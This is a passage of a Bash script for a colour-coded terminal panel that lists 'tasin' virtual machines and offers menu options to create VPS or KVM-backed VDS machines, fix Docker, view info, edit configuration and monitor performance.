            STATE=$(get_status "$vm")
            DISPLAY_NAME=${vm#tasin-vm-}

            if [ -f "/root/.tasin/vms/$DISPLAY_NAME/vm_type.info" ] && [ "$(cat /root/.tasin/vms/$DISPLAY_NAME/vm_type.info)" == "vds" ]; then
                TYPE_TAG="${PURPLE}VDS${NC}"
            else
                TYPE_TAG="${GREEN}VPS${NC}"
            fi

            pad_name=$(printf '%-24s' "$DISPLAY_NAME")
            pad_num=$(printf '%-2s' "$i")
            echo -e "  ${BLUE}│${NC} ${WHITE}${pad_num}${NC} ${CYAN}${pad_name}${NC} ${TYPE_TAG}  $STATE     ${BLUE}│${NC}"
            ((i++))
        done
        echo -e "  ${BLUE}└──┴──────────────────────────┴──────┴───────────────┘${NC}"
    fi

    echo -e ""
    # ─── Action menu (clean single-column layout, properly aligned) ───
    echo -e "  ${GREEN}┌─${NC} ${BOLD}CREATE & MANAGE${NC} ${GREEN}──────────────────────────┐${NC}"
    echo -e "  ${GREEN}│${NC}  ${GREEN}[N]${NC}  ${WHITE}Create New VM${NC}                          ${GREEN}│${NC}"
    echo -e "  ${GREEN}│${NC}  ${ORANGE}[F]${NC}  ${WHITE}Fix Docker (OverlayFS)${NC}                  ${GREEN}│${NC}"
    echo -e "  ${GREEN}└──────────────────────────────────────────┘${NC}"
    echo -e ""
    echo -e "  ${PURPLE}┌─${NC} ${BOLD}PREMIUM TOOLS${NC} ${PURPLE}─────────────────────────┐${NC}"
    echo -e "  ${PURPLE}│${NC}  ${PREMIUM}[I]${NC}  ${WHITE}Show VM Info${NC}                         ${PURPLE}│${NC}"
    echo -e "  ${PURPLE}│${NC}  ${PREMIUM}[E]${NC}  ${WHITE}Edit Configuration${NC}                    ${PURPLE}│${NC}"
    echo -e "  ${PURPLE}│${NC}  ${PREMIUM}[P]${NC}  ${WHITE}Live Performance Monitor${NC}              ${PURPLE}│${NC}"
    echo -e "  ${PURPLE}└──────────────────────────────────────────┘${NC}"
    echo -e ""
    echo -e "  ${RED}┌─${NC} ${BOLD}SYSTEM${NC} ${RED}──────────────────────────────┐${NC}"
    echo -e "  ${RED}│${NC}  ${RED}[X]${NC}  ${WHITE}Exit Panel${NC}                              ${RED}│${NC}"
    echo -e "  ${RED}└──────────────────────────────────────────┘${NC}"
    echo -e ""
    echo -e "  ${GOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -ne "  ${BRIGHT_ORANGE}▶${NC} ${YELLOW}Enter VM number or command${NC} ${DIM}[N/F/I/E/P/X]${NC}: "
    read -r CHOICE



    if [[ "$CHOICE" == "n" || "$CHOICE" == "N" ]]; then
        clear
        draw_banner
        echo -e ""

        if [ "$(check_real_kvm)" == "true" ]; then
            KVM_STAT="${GREEN}Available${NC}"
        else
            KVM_STAT="${RED}Not Available${NC}"
        fi

        echo -e "  Host KVM Status: $KVM_STAT"
        draw_separator
        echo -e "  1) ${GREEN}Create VPS${NC} (Standard Software Virtualization)"
        echo -e "  2) ${PURPLE}Create VDS${NC} (Full KVM Acceleration)"
        echo -e "  0) Back"
        draw_separator
        echo -n " Select [0-2]: "
        read -r create_type

        case "$create_type" in
            1) create_vm "vps" ;;
            2)
                if [ "$(check_real_kvm)" == "true" ]; then
                    create_vm "vds"
                else
                    echo -e " ${RED}✘ Cannot create VDS: Host CPU does not support KVM extensions.${NC}"
                    echo -e " ${YELLOW}Tip: Running 'mkdir /dev/kvm' will not work. You must use a real dedicated server.${NC}"
                    sleep 4
                fi
                ;;
            *) ;;
        esac
    elif [[ "$CHOICE" == "f" || "$CHOICE" == "F" ]]; then
         fix_docker
    elif [[ "$CHOICE" == "x" || "$CHOICE" == "X" ]]; then
        clear
        exit 0
    elif [[ "$CHOICE" == "i" || "$CHOICE" == "I" ]]; then
        if [ ${#VMS[@]} -eq 0 ]; then
            echo -e " ${YELLOW}No VMs to show info for.${NC}"
            sleep 2
        else
            clear
            echo -e "  ${PREMIUM}━━ SELECT VM FOR INFO ━━${NC}  ${PREMIUM}PREMIUM++${NC}"
            j=1; for _v in "${VMS[@]}"; do echo -e "   ${WHITE}[$j]${NC} ${CYAN}${_v#tasin-vm-}${NC}"; ((j++)); done
            echo -e "   ${DIM}[0] Cancel${NC}"
            echo -n " Enter VM number: "
            read -r info_num
            if [[ "$info_num" =~ ^[0-9]+$ ]] && [ "$info_num" -gt 0 ] && [ "$info_num" -le "${#VMS[@]}" ]; then
                show_vm_info "${VMS[$((info_num-1))]}"
            else
                echo -e " ${YELLOW}Cancelled.${NC}"
                sleep 1
            fi
        fi
    elif [[ "$CHOICE" == "e" || "$CHOICE" == "E" ]]; then
        if [ ${#VMS[@]} -eq 0 ]; then
            echo -e " ${YELLOW}No VMs to edit.${NC}"
            sleep 2
        else
            clear
            echo -e "  ${PREMIUM}━━ SELECT VM TO EDIT ━━${NC}  ${PREMIUM}PREMIUM++${NC}"
            j=1; for _v in "${VMS[@]}"; do echo -e "   ${WHITE}[$j]${NC} ${CYAN}${_v#tasin-vm-}${NC}"; ((j++)); done
            echo -e "   ${DIM}[0] Cancel${NC}"
            echo -n " Enter VM number: "
            read -r edit_num
            if [[ "$edit_num" =~ ^[0-9]+$ ]] && [ "$edit_num" -gt 0 ] && [ "$edit_num" -le "${#VMS[@]}" ]; then
                edit_vm_config "${VMS[$((edit_num-1))]}"
            else
                echo -e " ${YELLOW}Cancelled.${NC}"
                sleep 1
            fi
        fi
    elif [[ "$CHOICE" == "p" || "$CHOICE" == "P" ]]; then
        if [ ${#VMS[@]} -eq 0 ]; then
            echo -e " ${YELLOW}No VMs to monitor.${NC}"
            sleep 2
        else
            clear
            echo -e "  ${PREMIUM}━━ SELECT VM FOR LIVE PERFORMANCE ━━${NC}  ${PREMIUM}PREMIUM++${NC}"
            j=1; for _v in "${VMS[@]}"; do echo -e "   ${WHITE}[$j]${NC} ${CYAN}${_v#tasin-vm-}${NC}"; ((j++)); done
            echo -e "   ${DIM}[0] Cancel${NC}"
            echo -n " Enter VM number: "
            read -r perf_num
            if [[ "$perf_num" =~ ^[0-9]+$ ]] && [ "$perf_num" -gt 0 ] && [ "$perf_num" -le "${#VMS[@]}" ]; then
                live_vm_performance "${VMS[$((perf_num-1))]}"
            else
                echo -e " ${YELLOW}Cancelled.${NC}"
                sleep 1
            fi
        fi
    elif [[ "$CHOICE" =~ ^[0-9]+$ ]] && [ "$CHOICE" -le "${#VMS[@]}" ] && [ "$CHOICE" -gt 0 ]; then
        INDEX=$((CHOICE-1))
        SELECTED_VM=${VMS[$INDEX]}
        manage_vm_menu "$SELECTED_VM"
    else
        echo -e " ${RED}Invalid Selection.${NC}"
        sleep 1
    fi
done
